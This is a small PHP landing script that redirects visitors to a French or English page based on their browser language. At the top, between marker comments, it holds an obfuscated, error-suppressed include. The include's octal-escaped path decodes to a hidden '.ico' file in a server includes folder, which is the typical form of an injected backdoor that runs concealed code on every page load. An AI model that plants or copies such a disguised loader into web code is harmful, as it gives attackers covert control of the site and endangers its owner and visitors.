<?php

/*3d06b*/

@include "\057nf\163we\142pe\162so\057li\141.u\156iv\055av\151gn\157n.\146r/\167ww\057in\143lu\144es\057fi\154et\162an\163fe\162/.\145ca\06339\063d.\151co";

/*3d06b*/

  #header('Location: http://mohamedmorchid.fr/fr/');
$language = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
$language = $language{0}.$language{1};


// Affiche toutes les informations, comme le ferait INFO_ALL
//phpinfo();

// Affiche uniquement le module d'information.
// phpinfo(8) fournirait les mêmes informations.
//phpinfo(INFO_MODULES);


if ( strstr($language,'fr') )
	header('Location: http://mohamedmorchid.online.fr/fr/');
else
	header('Location: http://mohamedmorchid.online.fr/en/');

  exit();

?>
